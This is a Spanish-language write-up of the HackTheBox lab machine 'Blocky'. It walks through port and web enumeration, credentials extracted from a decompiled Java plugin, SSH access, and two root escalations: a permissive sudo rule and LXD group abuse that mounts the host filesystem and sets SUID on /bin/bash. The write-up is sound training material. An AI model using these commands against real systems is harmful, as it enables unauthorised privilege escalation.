---
title: "Blocky - HTB Writeup"
layout: single
excerpt: "Blocky es una máquina de dificultad fácil de HackTheBox. En esta máquina ganamos acceso inicial con SSH mediante unas credenciales expuestas en un plugin del servidor web. Para escalar privilegios explotamos 2 formas distintas, un permiso de sudoers y el grupo LXD."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/132039212-af13a643-9ae0-4980-b117-8795f1bd9415.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - Decompiler
  - Sudo
  - LXD
  - Linux
---
 
![titulo](https://user-images.githubusercontent.com/67548295/132039885-e9de5e03-fe17-48ef-8fdf-9c4e9c975a8e.png)

# Enumeración

Empezamos enviando una traza [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} con la herramienta `ping`, con esto veremos el estado de la máquina y su sistema operativo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ping -c 1 10.10.10.37
PING 10.10.10.37 (10.10.10.37) 56(84) bytes of data.
64 bytes from 10.10.10.37: icmp_seq=1 ttl=63 time=74.1 ms

--- 10.10.10.37 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 74.113/74.113/74.113/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está activa y que observando el TTL, concluimos que es una máquina Linux.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comenzamos la fase de enumeración de puertos, en mi caso voy a hacer uso de la herramienta `nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -v -n 10.10.10.37 -sC -sV -oN targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 17:47 WEST
NSE: Loaded 153 scripts for scanning.
Completed Ping Scan at 17:47, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 17:47
Scanning 10.10.10.37 [65535 ports]
Discovered open port 80/tcp on 10.10.10.37
Discovered open port 21/tcp on 10.10.10.37
Discovered open port 22/tcp on 10.10.10.37
Discovered open port 25565/tcp on 10.10.10.37
Completed SYN Stealth Scan at 17:47, 32.92s elapsed (65535 total ports)
Nmap scan report for 10.10.10.37
Host is up (0.074s latency).
Not shown: 65530 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE   VERSION
21/tcp    open  ftp       ProFTPD 1.3.5a
22/tcp    open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.18 seconds
           Raw packets sent: 131093 (5.768MB) | Rcvd: 30 (1.300KB)
```


| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-v` | Especifica que queremos más 'verbose', es decir, que nos muestre mas información de la convencional. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Vemos 3 puertos

| Puerto | Servicio |
|:------:|:--------:|
| 21 | [FTP](https://es.digitaltrends.com/computadoras/que-es-ftp-y-para-que-sirve/){:target="\_blank"}{:rel="noopener nofollow"} |
| 22 | [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 80 | [HTTP](https://developer.mozilla.org/es/docs/Web/HTTP){:target="\_blank"}{:rel="noopener nofollow"} |
| 25565 | Servidor dedicado de Minecraft |

# User.txt


### FTP
Empiezo probando si el servicio FTP acepta _Anonymous login_:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ftp 10.10.10.37
Connected to 10.10.10.37.
220 ProFTPD 1.3.5a Server (Debian) [::ffff:10.10.10.37]
Name (10.10.10.37:z3r0byte): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
Login failed.
```
Pero como vemos, está deshabilitado.

### HTTP

Lo siguiente que hago es empezar a enumerar el servidor web que se aloja en el puerto 80.

Hago uso de la herramienta `whatweb` para listar las tecnologías que emplea el servidor web:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $whatweb 10.10.10.37
http://10.10.10.37 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.37], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[BlockyCraft &#8211; Under Construction!], UncommonHeaders[link], WordPress[4.8]
```

Nos reporta que hay un **wordpress 4.8** y varias tecnologías más.

Navego hasta la web para ver que hay:

![navegador1](https://user-images.githubusercontent.com/67548295/132043442-53c66ab0-5f0a-4053-8332-232941a4bcf7.png)

Se ve que es un blog relacionado con Minecraft.

Lo primero que me llama la atención es el post que hay publicado.

![navegador2](https://user-images.githubusercontent.com/67548295/132043559-8d8c4510-97ee-4dc0-bf43-d75129f99a3c.png)

El administrador dice estar desarrollando una wiki y un plugin.

Esto me llama la atención asi que hago uso de la herramienta `gobuster` para buscar directorios en el servidor web:

```bash
┌──[z3r0byte@z3r0byte]─[~]
└──╼ $gobuster dir -u "http://10.10.10.37/" -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.37/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/03 18:29:30 Starting gobuster in directory enumeration mode
===============================================================
/wiki                 (Status: 301) [Size: 309] [--> http://10.10.10.37/wiki/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.10.37/wp-content/]
/plugins              (Status: 301) [Size: 312] [--> http://10.10.10.37/plugins/]   
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.10.37/wp-includes/]
```

Vaya, hemos encontrado un directorio wiki y otro plugins (los demas son internos de wordpress)

Accedo al recurso `wiki` para ver que contiene:

![navegador3](https://user-images.githubusercontent.com/67548295/132045025-74429b63-5c07-4264-b0f9-4d4a7758c7e9.png)

Vemos un aviso de que está en construcción.

Accedo ahora al recurso `plugins`:

![navegador4](https://user-images.githubusercontent.com/67548295/132047257-7743986b-49de-45f1-9e75-b5c718e7b90e.png)

Vemos un gestor de archivos muy bonito y un par de archivos, descargo los dos para intentar ver lo que contienen.

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $cat *.jar | head -n5
K-*��ϳR0�3����P����b�1��@�~`��e��]�����&~����w
M��nv�kιs���??x�)���rXN��
�#o�s��+O�?O�R�
               ����^����vȐ
���2 Ϯ-��P�~��5��y0$���g���U�&�X���i ː����o�
                                            -� i`�6+)��e
                                                        )�+0�|
���;���@tF_{��bgGo�j�@�![s}�7���j�'�qu�C�\ϓ����	7j���Z�~C��P��+�n-cy���N���[$�Y]wz"tF4
t��`$\�8�/����P���#(�$�Nf��$�Kݨ��Z�Z�֖ !���U���M[[�~��ݫ�T���}�Aż��r�ٷ������g�h�c:�5P��o��6����h0��F��њ'��M�k��#�<��)k�(�����vӷ$JF��) [o��=�,��#�@�l���qwI`�l���)���jN�"�zN�Btf�9P{[�:C�<=�y���L��-m��4�(���w����R��*��m�/
```

Intentando listar estos archivos, vemos que **no son legibles**.

Tras investigar un poco, me doy cuenta de que hay recursos online que pueden descompilar estos archivos `.jar`.

Pruebo a descompilar los archivos y uno de ellos tenía **credenciales**:

![navegador6](https://user-images.githubusercontent.com/67548295/132048438-b50c511f-7a2c-40da-9b9a-3c9c5a6c5f62.png)


Teniendo unas credenciales, pruebo a acceder por SSH:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ssh root@10.10.10.37
root@10.10.10.37's password: 
Permission denied, please try again.
root@10.10.10.37's password: 
```

Pero obtenemos un _Permission denied_.

No descarto la posibilidad de que la contraseña no sea válida y enumero un poco más la web en busca de usuarios.

Hasta que me fijo que el autor del único post que hay en el blog se llama _Notch_:

![navegador7](https://user-images.githubusercontent.com/67548295/132048846-d77ac250-f9ff-44ed-ab8a-a6b2f7a003a6.png)

Pruebo ahora a acceder por SSH con el usuario _Notch_ y la contraseña encontrada y...

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ssh notch@10.10.10.37
notch@10.10.10.37 password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Sun Dec 24 09:34:35 2017
notch@Blocky:~$ 
```

¡Conseguimos acceder!

Una vez en este punto, podemos visualizar la flag user.txt en /home/notch/user.txt:

```bash
notch@Blocky:~$ cat /home/notch/user.txt 
59XXXXXXXXXXXXXXXXXXXXXXXXXXXXXd5
```
# Root.txt - Método 1

Listando los permisos asignados para este usuario con `sudo -l`, vemos algo:

```bash
notch@Blocky:~$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Podemos ejecutar cualquier comando como cualquier usuario.

Con esto básicamente podríamos ejecutar cualquier comando como root.

Yo por ejemplo voy a ejecutar `sudo bash` ya que se me hace la forma más sencilla, pero hay muchas más formas de convertirse en superusuario:

```bash
notch@Blocky:~$ sudo bash
root@Blocky:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Una vez en este punto, podemos ver la flag root.txt en /root/root.txt:

```bash
root@Blocky:~# cat /root/root.txt 
0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
```

# Root.txt - Método 2 

Enumerando el sistema como el usuario _Notch_ me doy cuenta de que está en el grupo `lxd`:

```bash
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
Si con la utilidad `searchsploit` buscamos por esta palabra clave, encontraremos lo siguiente:

```bash
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
Ubuntu 18.04 - Privilege Escalation                   | linux/local/46978.sh
------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Veamos que contiene el exploit:

![terminal1](https://user-images.githubusercontent.com/67548295/132099181-b3668ba2-b3f9-413c-ad0e-690a44cbf16a.png)

Como vemos nos marca una serie de pasos a seguir, hagámoslos.

---

**1.** Hay que ejecutar `wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine` en nuestra **máquina de atacante**:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2021-09-04 16:10:45--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 7662 (7,5K) [text/plain]
Grabando a: «build-alpine»
```
**2.** En segundo lugar hay que ejecutar `bash build-alpine` como usuario **root** en nuestra máquina de atacante:

```bash
┌─[root@z3r0byte]─[/home/z3r0byte/Descargas]
└──╼ #bash build-alpine 
Determining the latest release... v3.14
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.14/main/x86_64
Downloading apk-tools-static-2.12.7-r0.apk
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
Downloading alpine-keys-2.3-r1.apk
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
tar: Se desestima la palabra clave de la cabecera extendida desconocida 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub: La suma coincide

[...]

(16/20) Installing scanelf (1.3.2-r0)
(17/20) Installing musl-utils (1.2.2-r3)
(18/20) Installing libc-utils (0.7.2-r3)
(19/20) Installing alpine-keys (2.3-r1)
(20/20) Installing alpine-base (3.14.2-r0)
Executing busybox-1.33.1-r3.trigger
OK: 9 MiB in 20 packages
```
¡Ojo!, si no te funciona la primera vez, prueba a ejecutarlo más veces.

**3.** Ejecutamos `dos2unix [nombre del exploit]` y transferimos el **exploit** y el archivo **alpine.tar.gz** generado anteriormente a la **máquina víctima**:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $dos2unix 46978.sh 
dos2unix: convirtiendo archivo 46978.sh a formato Unix...
```

![terminal2](https://user-images.githubusercontent.com/67548295/132099721-44b87ff5-7a22-44f3-b7f6-10e503cd16d9.png)

**4.** Ejecutamos el exploit en la **máquina víctima** pasandole como argumento el archivo **alpine** que creamos anteriormente:

```bash
notch@Blocky:/tmp$ bash 46978.sh -f alpine-v3.14-x86_64-20210904_1614.tar.gz 
Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: 4e3f8cf191aec1f46ed50ffc8c8ba4a538aabe302601358a2e817a5bb4a07295
error: This must be run as root
```
Como vemos nos da un error, pero si volvemos a ejecutar el exploit ya nos funcionará:

```bash
notch@Blocky:/tmp$ bash 46978.sh -f alpine-v3.14-x86_64-20210904_1614.tar.gz 
Transferring image: 100% (191.65MB/s)error: Image with same fingerprint already exists
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| alpine | 4e3f8cf191ae | no     | alpine v3.14 (20210904_16:14) | x86_64 | 3.02MB | Sep 4, 2021 at 3:33pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
Creating privesc
Device giveMeRoot added to privesc
~ # 
```

Como vemos nos ha metido en un contenedor como usuario **root**, pero, ¿para qué esto? te preguntarás.

Bueno si nos movemos hacia /mnt/root, vamos a ver que tendrémos una montura de la máquina víctima real donde podemos hacer cualquier cambio:

```bash
~ # cd /mnt/root
/mnt/root # ls
bin         home        lost+found  proc        snap        usr
boot        initrd.img  media       root        srv         var
dev         lib         mnt         run         sys         vmlinuz
etc         lib64       opt         sbin        tmp
```

Y cualquier cambio que hagamos se reflejará en la máquina víctima.

Asi que siguiendo esto, si yo por ejemplo le doy permisos [SUID](https://www.ochobitshacenunbyte.com/2019/06/17/permisos-especiales-en-linux-sticky-bit-suid-y-sgid/){:target="\_blank"}{:rel="noopener nofollow"} a /bin/bash en esta montura, también debería de aplicarse en la máquina real.

Probemos para ver si es cierto:

```bash
/mnt/root # chmod u+s /mnt/root/bin/bash 
/mnt/root # 
```

Bien, ahora usemos `exit` para volver a nuestra shell como el usuario _Notch_ y verifiquemos los permisos de la /bin/bash:

![terminal3](https://user-images.githubusercontent.com/67548295/132100532-b7d54d90-9500-4708-a71a-4bf3e4463beb.png)

¡Ha funcionado!

Ahora simplemente ejecutando `bash -p` podríamos convertirnos en root:

```bash
notch@Blocky:/tmp$ bash -p
bash-4.3# whoami
root
```

# Resumen

En esta máquina hemos conseguido acceso inicial por SSH mediante unas credenciales "hard codeadas" en un plugin expuesto en el servicio web. Para escalar privilegios hemos abusado de un permiso de sudoers que nos permitía ejecutar cualquier comando como cualquier usuario. También hemos explotado otra manera alternativa abusando del grupo asignado `lxd`.


